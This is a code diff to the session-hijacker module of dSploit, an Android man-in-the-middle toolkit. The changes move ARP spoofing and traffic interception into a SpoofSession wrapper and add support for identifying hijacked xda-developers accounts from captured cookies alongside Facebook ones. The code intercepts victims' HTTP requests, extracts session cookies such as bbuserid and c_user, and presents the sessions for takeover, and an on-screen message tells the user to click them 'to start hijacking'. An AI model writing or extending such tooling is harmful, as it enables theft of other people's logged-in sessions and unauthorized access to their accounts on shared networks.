@@ -36,9 +36,8 @@ import it.evilsocket.dsploit.core.System;
 import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog.ConfirmDialogListener;
 import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog;
 import it.evilsocket.dsploit.net.http.RequestParser;
-import it.evilsocket.dsploit.net.http.proxy.Proxy;
 import it.evilsocket.dsploit.net.http.proxy.Proxy.OnRequestListener;
-import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;
+import it.evilsocket.dsploit.plugins.mitm.SpoofSession.OnSessionReadyListener;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
@@ -69,7 +68,7 @@ public class Hijacker extends SherlockActivity
 	private ListView 		   mListView    	   = null;		
 	private SessionListAdapter mAdapter			   = null;
 	private boolean	     	   mRunning			   = false;	
-	private Proxy			   mProxy			   = null;
+	private SpoofSession	   mSpoof			   = null;
 	
 	public static class Session
 	{
@@ -109,6 +108,9 @@ public class Hijacker extends SherlockActivity
 		else if( domain.contains( "twitter." ) )
 			return R.drawable.favicon_twitter;
 		
+		else if( domain.contains( "xda-developers." ) )
+			return R.drawable.favicon_xda;
+		
 		else
 			return R.drawable.favicon_generic;
 	}
@@ -131,7 +133,7 @@ public class Hijacker extends SherlockActivity
 			        InputStream 		input  = conn.getInputStream();
 			        BufferedInputStream reader = new BufferedInputStream( input );
 			        
-			        image = BitmapFactory.decodeStream( reader );
+			        image = Bitmap.createScaledBitmap( BitmapFactory.decodeStream( reader ), 48, 48, false );
 			        
 			        reader.close();
 			        input.close();
@@ -175,8 +177,7 @@ public class Hijacker extends SherlockActivity
 				
 				return username;
 			}
-			
-			
+						
 			@Override
 			protected Boolean doInBackground(Session... sessions) {
 				Session 			session = sessions[0];
@@ -193,8 +194,49 @@ public class Hijacker extends SherlockActivity
 				}
 				
 				return true;
+			}			
+		}
+		
+		private class XdaUserTask extends AsyncTask<Session, Void, Boolean> 
+		{
+			private Bitmap getUserImage( String uri ) {
+			    Bitmap image = null;
+			    try 
+			    {
+			        URL 		  url  = new URL( uri );
+			        URLConnection conn = url.openConnection();
+			        conn.connect();
+			        
+			        InputStream 		input  = conn.getInputStream();
+			        BufferedInputStream reader = new BufferedInputStream( input );
+			        
+			        image = Bitmap.createScaledBitmap( BitmapFactory.decodeStream( reader ), 48, 48, false );
+			        
+			        reader.close();
+			        input.close();
+			    } 
+			    catch( IOException e ) 
+			    {
+			        System.errorLogging( "HIJACKER", e );
+			    } 
+			    
+			    return image;
 			}
-			
+	
+			@Override
+			protected Boolean doInBackground(Session... sessions) {
+				Session 			session  = sessions[0];
+				BasicClientCookie   userid   = session.mCookies.get("bbuserid"),
+									username = session.mCookies.get("xda_wikiUserName");
+				
+				if( userid != null )
+					session.mPicture = getUserImage( "http://media.xda-developers.com/customavatars/avatar" + userid.getValue() + "_1.gif" );
+				
+				if( username != null )
+					session.mUserName = username.getValue().toLowerCase();
+									
+				return true;
+			}			
 		}
 		
 		public class SessionHolder
@@ -245,16 +287,22 @@ public class Hijacker extends SherlockActivity
 	            holder.address  = ( TextView )row.findViewById( R.id.sessionTitle );
 	            holder.domain   = ( TextView )row.findViewById( R.id.sessionDescription );
 	            
-	            row.setTag( holder );	     
-	            
-	            if( session.mInited == false && session.mDomain.contains("facebook.") )
-	        	{
-	        		session.mInited = true;
-	        		new FacebookUserTask().execute( session );
-	        	}	 
+	            row.setTag( holder );	     	            	
 	        }
 	        else	        
 	            holder = ( SessionHolder )row.getTag();
+	        
+            if( session.mInited == false )
+        	{            	
+        		session.mInited = true;
+        	
+        		if( session.mDomain.contains("facebook.") && session.mCookies.get("c_user") != null )
+        			new FacebookUserTask().execute( session );
+        		
+        		else if( session.mDomain.contains("xda-developers.") && session.mCookies.get("bbuserid") != null )
+        			new XdaUserTask().execute( session );
+        	}
+           
 
 	        if( session.mPicture != null )
 	        	holder.favicon.setImageBitmap( session.mPicture );
@@ -282,7 +330,7 @@ public class Hijacker extends SherlockActivity
         mHijackProgress	    = ( ProgressBar )findViewById( R.id.hijackActivity );
         mListView 		    = ( ListView )findViewById( R.id.listView );
         mAdapter		    = new SessionListAdapter( R.layout.plugin_mitm_hijacker_list_item );
-        mProxy				= System.getProxy();
+        mSpoof				= new SpoofSession();
         
         mListView.setAdapter( mAdapter );
         mListView.setOnItemClickListener( new OnItemClickListener() {
@@ -326,7 +374,7 @@ public class Hijacker extends SherlockActivity
 			}} 
 		);  
         
-        mProxy.setOnRequestListener( new OnRequestListener() {			
+        System.getProxy().setOnRequestListener( new OnRequestListener() {			
 			@Override
 			public void onRequest( String address, String hostname, ArrayList<String> headers ) {
 				ArrayList<BasicClientCookie> cookies = RequestParser.getCookiesFromHeaders( headers );
@@ -375,37 +423,26 @@ public class Hijacker extends SherlockActivity
 	}
 	
 	private void setStartedState( ) {	
-		mProxy.stop();
-		System.getEttercap().kill();
-		System.setForwarding( false );
-		
-		System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
+		mSpoof.start( new OnSessionReadyListener() {			
 			@Override
-			public void onReady() 
-			{
-				System.setForwarding( true );
-								
-				new Thread( mProxy ).start();
-				
-				System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );									
+			public void onSessionReady() {
+				Hijacker.this.runOnUiThread( new Runnable() {					
+					@Override
+					public void run() {
+						mHijackProgress.setVisibility( View.VISIBLE );
+						mRunning = true;
+						
+						Toast.makeText( Hijacker.this, "Once you see realtime sessions on the list, click on them to start hijacking.", Toast.LENGTH_LONG ).show();	    
+					}
+				});
 			}
-			
-		}).start();			
-		
-		mHijackProgress.setVisibility( View.VISIBLE );
-		mRunning = true;
-		
-		Toast.makeText( this, "Once you see realtime sessions on the list, click on them to start hijacking.", Toast.LENGTH_LONG ).show();	    
+		});
 	}
 	
-	private void setStoppedState( ) {				
-		System.getIPTables().undoPortRedirect( 80, System.HTTP_PROXY_PORT );
-		System.getEttercap().kill();
-		System.setForwarding( false );
-		
-		if( mProxy != null )		
-			mProxy.stop();
-		
+	private void setStoppedState( ) {		
+		mSpoof.stop();
+
+		System.getProxy().setOnRequestListener( null );	    
 		mHijackProgress.setVisibility( View.INVISIBLE );
 		
 		mRunning = false;
@@ -430,10 +467,7 @@ public class Hijacker extends SherlockActivity
 	
 	@Override
 	public void onBackPressed() {
-	    setStoppedState();	
-	    if( mProxy != null )
-	    	mProxy.setOnRequestListener( null );
-	    
+	    setStoppedState();		    
 	    super.onBackPressed();
 	    overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
 	}
